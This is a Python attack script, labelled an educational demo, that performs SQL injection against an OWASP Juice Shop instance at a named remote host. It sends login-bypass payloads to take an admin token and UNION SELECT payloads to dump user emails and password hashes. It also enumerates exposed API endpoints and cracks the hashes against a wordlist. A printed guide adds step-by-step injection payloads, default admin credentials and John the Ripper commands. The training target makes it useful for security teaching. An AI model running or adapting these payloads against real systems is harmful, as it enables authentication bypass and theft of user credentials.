#!/usr/bin/env python3
"""
OWASP Juice Shop SQL Injection Demo
Educational script to demonstrate SQL injection vulnerability
"""

import requests
import json
import hashlib
from urllib.parse import quote

class JuiceShopSQLi:
    def __init__(self, base_url):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()
        
    def test_login_sqli(self):
        """Test basic SQL injection on login"""
        print("\n[*] Testing SQL Injection on Login...")
        
        # Common SQL injection payloads
        payloads = [
            "' OR '1'='1'--",
            "' OR 1=1--",
            "admin@juice-sh.op'--",
            "' OR '1'='1'/*",
            "admin' --",
            "' or 1=1 --",
            "') or '1'='1'--"
        ]
        
        for payload in payloads:
            print(f"\n[+] Testing payload: {payload}")
            
            login_data = {
                "email": payload,
                "password": "anything"
            }
            
            try:
                response = self.session.post(
                    f"{self.base_url}/rest/user/login",
                    json=login_data,
                    headers={"Content-Type": "application/json"}
                )
                
                if response.status_code == 200:
                    print(f"[✓] SQL Injection successful with payload: {payload}")
                    data = response.json()
                    if 'authentication' in data:
                        print(f"[✓] Got token: {data['authentication']['token'][:20]}...")
                        return data['authentication']['token']
                else:
                    print(f"[-] Payload failed: {response.status_code}")
                    
            except Exception as e:
                print(f"[-] Error: {e}")
        
        return None

    def extract_users_via_search(self):
        """Extract user data via SQL injection in search"""
        print("\n[*] Extracting Users via Search SQL Injection...")
        
        # SQL injection to extract users table
        sqli_payloads = [
            "')) UNION SELECT id,email,password,role,null,null,null,null,null FROM Users--",
            "')) UNION SELECT sql,null,null,null,null,null,null,null,null FROM sqlite_master--",
            "')) UNION SELECT id,email,password,'4','5','6','7','8','9' FROM Users--",
            "')) UNION SELECT 1,email,password,4,5,6,7,8,9 FROM Users--"
        ]
        
        for payload in sqli_payloads:
            print(f"\n[+] Testing: {payload[:50]}...")
            
            try:
                response = self.session.get(
                    f"{self.base_url}/rest/products/search",
                    params={"q": payload}
                )
                
                if response.status_code == 200:
                    data = response.json()
                    if 'data' in data and len(data['data']) > 0:
                        print("[✓] SQL Injection successful!")
                        print("\n[*] Extracted Data:")
                        for item in data['data']:
                            # Check if this looks like user data
                            if '@' in str(item.get('name', '')):
                                print(f"Email: {item.get('name')}")
                                print(f"Password Hash: {item.get('description')}")
                                self.crack_hash(item.get('description', ''))
                        return data
                        
            except Exception as e:
                print(f"[-] Error: {e}")
        
        return None

    def extract_via_api(self):
        """Try direct API SQL injection"""
        print("\n[*] Testing API Endpoints...")
        
        # Try to access users directly (sometimes exposed)
        endpoints = [
            "/api/Users",
            "/api-docs",
            "/rest/user/whoami"
        ]
        
        for endpoint in endpoints:
            try:
                response = self.session.get(f"{self.base_url}{endpoint}")
                if response.status_code == 200:
                    print(f"[✓] Found exposed endpoint: {endpoint}")
                    data = response.json()
                    if 'data' in data:
                        for user in data['data']:
                            if 'email' in user:
                                print(f"\nUser: {user.get('email')}")
                                if 'password' in user:
                                    print(f"Hash: {user.get('password')}")
            except:
                pass

    def crack_hash(self, hash_value):
        """Try to crack common hashes"""
        if not hash_value:
            return
            
        common_passwords = [
            'admin123', 'admin', 'password', 'password123', 
            'admin@123', 'juice', 'shop', 'juiceshop'
        ]
        
        print(f"\n[*] Attempting to crack hash: {hash_value}")
        
        for password in common_passwords:
            # Try MD5
            if hashlib.md5(password.encode()).hexdigest() == hash_value:
                print(f"[✓] Password cracked (MD5): {password}")
                return password
            
            # Try SHA256
            if hashlib.sha256(password.encode()).hexdigest() == hash_value:
                print(f"[✓] Password cracked (SHA256): {password}")
                return password
        
        print("[-] Could not crack with common passwords")
        return None

    def demonstrate_union_injection(self):
        """Demonstrate UNION-based SQL injection"""
        print("\n[*] Demonstrating UNION-based Injection...")
        print("\nStep 1: Find number of columns")
        print("Payload: ' ORDER BY 1--")
        print("Payload: ' ORDER BY 2--")
        print("Keep increasing until error occurs")
        
        print("\nStep 2: Use UNION SELECT")
        print("Payload: ' UNION SELECT 1,2,3,4,5,6,7,8,9--")
        
        print("\nStep 3: Extract data")
        print("Payload: ' UNION SELECT id,email,password,'','','','','','' FROM Users--")
        
        print("\nStep 4: Target admin specifically")
        print("Payload: ' UNION SELECT * FROM Users WHERE email='admin@juice-sh.op'--")

def main():
    # Default to juice5.wonkatech.org
    print("=" * 60)
    print("OWASP Juice Shop SQL Injection Demo")
    print("For Educational Purposes Only!")
    print("=" * 60)
    
    # Default target is juice5.wonkatech.org
    base_url = "https://juice5.wonkatech.org"
    
    print(f"\n[*] Target: {base_url}")
    print("[*] Targeting juice5.wonkatech.org CTF instance")
    
    # Initialize exploit
    exploit = JuiceShopSQLi(base_url)
    
    # Run demonstrations
    print("\n" + "=" * 60)
    print("DEMONSTRATION 1: Login SQL Injection")
    print("=" * 60)
    token = exploit.test_login_sqli()
    
    print("\n" + "=" * 60)
    print("DEMONSTRATION 2: Search SQL Injection")
    print("=" * 60)
    exploit.extract_users_via_search()
    
    print("\n" + "=" * 60)
    print("DEMONSTRATION 3: API Enumeration")
    print("=" * 60)
    exploit.extract_via_api()
    
    print("\n" + "=" * 60)
    print("DEMONSTRATION 4: Manual Injection Guide")
    print("=" * 60)
    exploit.demonstrate_union_injection()
    
    print("\n" + "=" * 60)
    print("TYPICAL ADMIN CREDENTIALS IN JUICE SHOP:")
    print("=" * 60)
    print("Email: admin@juice-sh.op")
    print("Password: admin123")
    print("Hash (MD5): 0192023a7bbd73250516f069df18b500")
    print("\nTo crack hashes manually:")
    print("1. Save hash to file: echo '0192023a7bbd73250516f069df18b500' > hash.txt")
    print("2. Use John: john --format=raw-md5 hash.txt")
    print("3. Or use online tools like crackstation.net")

if __name__ == "__main__":
    main()

